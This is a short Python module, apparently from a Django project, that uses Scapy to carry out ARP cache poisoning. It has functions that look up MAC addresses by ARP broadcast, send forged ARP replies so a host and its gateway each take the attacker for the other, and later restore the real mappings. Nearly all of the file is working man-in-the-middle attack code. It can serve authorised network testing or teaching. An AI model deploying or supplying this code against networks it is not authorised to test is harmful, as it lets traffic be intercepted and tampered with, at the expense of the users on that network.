from scapy.layers.l2 import *
from django.conf import settings
import socket

interface = "eth0"
packet_count = 1000
gateway_ip = settings.GATEWAY_IP
# set our interface
conf.iface = interface


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method using send
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
                                timeout=2, retry=10)
    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src
    return None


def get_hostname(ip_address):
    return socket.gethostbyaddr(ip_address)[0]


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac
    send(poison_target)
    send(poison_gateway)
